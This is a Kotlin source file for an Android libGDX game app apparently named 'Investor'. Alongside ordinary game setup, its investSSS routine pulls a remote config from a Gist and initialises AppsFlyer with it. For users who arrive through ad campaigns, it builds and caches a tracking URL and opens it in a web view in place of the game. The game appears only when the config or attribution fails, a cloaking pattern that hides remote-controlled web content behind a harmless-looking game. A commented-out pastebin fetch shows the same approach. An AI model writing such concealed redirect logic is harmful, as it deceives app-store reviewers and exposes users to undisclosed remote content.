package com.cinvestor.crotcevni.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.appsflyer.attribution.AppsFlyerRequestListener
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.cinvestor.crotcevni.MainActivity
import com.cinvestor.crotcevni.appContext
import com.cinvestor.crotcevni.game.dataStore.DS_Balance
import com.cinvestor.crotcevni.game.dataStore.DS_Level
import com.cinvestor.crotcevni.game.manager.MusicManager
import com.cinvestor.crotcevni.game.manager.NavigationManager
import com.cinvestor.crotcevni.game.manager.SoundManager
import com.cinvestor.crotcevni.game.manager.SpriteManager
import com.cinvestor.crotcevni.game.manager.util.MusicUtil
import com.cinvestor.crotcevni.game.manager.util.SoundUtil
import com.cinvestor.crotcevni.game.manager.util.SpriteUtil
import com.cinvestor.crotcevni.game.screens.LoaderScreen
import com.cinvestor.crotcevni.game.utils.GameColor
import com.cinvestor.crotcevni.game.utils.advanced.AdvancedGame
import com.cinvestor.crotcevni.game.utils.disposeAll
import com.cinvestor.crotcevni.game.utils.gdxGame
import com.cinvestor.crotcevni.util.Gist
import com.cinvestor.crotcevni.util.log
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.atomic.AtomicBoolean

var GLOBAL_isGame = false
    private set

var GLOBAL_isPauseGame = false

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil()    }
    val soundUtil by lazy { SoundUtil()    }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("S-Investor", MODE_PRIVATE)

    val ds_Balance = DS_Balance(coroutine)
    val ds_Level   = DS_Level(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        investSSS()
    }

    override fun render() {
        if (GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun investSSS() {
        log("investSSS")
        activity.blockRedirect = { GLOBAL_isGame = true }
        activity.initWeb()

        val path = sharedPreferences.getString("InvestS", "N") ?: "N"

        try {
            if (path == "N") {
                coroutine.launch(Dispatchers.Main) {
                    val poket = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    if (poket != null) {
                        AppsFlyerLib.getInstance().init(poket.drop, getAppsFlyerConversionListener(poket.new_link), appContext)
                        AppsFlyerLib.getInstance().start(gdxGame.activity, poket.drop, getAppsFlyerRequestListener())
                    } else {
                        GLOBAL_isGame = true
                    }
                }
            } else {
                activity.showUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GLOBAL_isGame = true
        }
    }

//    private suspend fun requestGet() = CompletableDeferred<NameJSON?>().also { continuation ->
//        val urlString = "https://pastebin.com/raw/qq4hKgyP"
//
//        try {
//            val url        = URL(urlString)
//            val connection = url.openConnection() as HttpURLConnection
//
//            connection.requestMethod           = "GET"
//            connection.connectTimeout          = 5000
//            connection.readTimeout             = 5000
//            connection.instanceFollowRedirects = true
//
//            val responseCode = connection.responseCode
//
//            if (responseCode == HttpURLConnection.HTTP_OK) {
//                val reader = BufferedReader(InputStreamReader(connection.inputStream))
//                val response = StringBuilder()
//                var line: String?
//
//                while (reader.readLine().also { line = it } != null) {
//                    response.append(line)
//                }
//                reader.close()
//
//                val jsonResponse = JSONObject(response.toString())
//                log("json = $jsonResponse")
//
//                val getJSON = NameJSON(
//                    inpestor  = jsonResponse.getString("inpestor")  ?: "",
//                    resistor  = jsonResponse.getString("resistor")  ?: "",
//                )
//                continuation.complete(getJSON)
//
//            } else {
//                log("Запит не успішний. Код відповіді: $responseCode")
//                continuation.complete(null)
//            }
//            connection.disconnect()
//        } catch (e: Exception) {
//            log("Error: ${e.message}")
//            e.printStackTrace()
//            continuation.complete(null)
//        }
//    }.await()

//    private data class NameJSON(val inpestor: String, val resistor: String)

    private fun getAppsFlyerConversionListener(sma: String) = object : AppsFlyerConversionListener {
        private val isAppsflyerGetData = AtomicBoolean(false)

        override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
            if (isAppsflyerGetData.getAndSet(true)) return

            if (appfMap != null) {
                val campaign = appfMap["campaign"]     as? String
                val afAd     = appfMap["af_ad"]        as? String
                val media    = appfMap["media_source"] as? String

                log("Result: campaign = $campaign | afAd = $afAd | media_source = $media | appfMap = $appfMap")

                val link = "$sma?shfvjs=$campaign&dsagbs=$afAd&gsg=$media"
                log("link = $link")

                coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("InvestS", link).apply() }

                activity.showUrl(link)

            } else GLOBAL_isGame = true
        }

        override fun onConversionDataFail(p0: String?) {
            if (isAppsflyerGetData.getAndSet(true)) return
            GLOBAL_isGame = true
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    private fun getAppsFlyerRequestListener() = object : AppsFlyerRequestListener {
        override fun onSuccess() {
            log("AppsFlyer: onSuccess")
        }

        override fun onError(p0: Int, p1: String) {
            log("AppsFlyer: onError")
        }
    }

}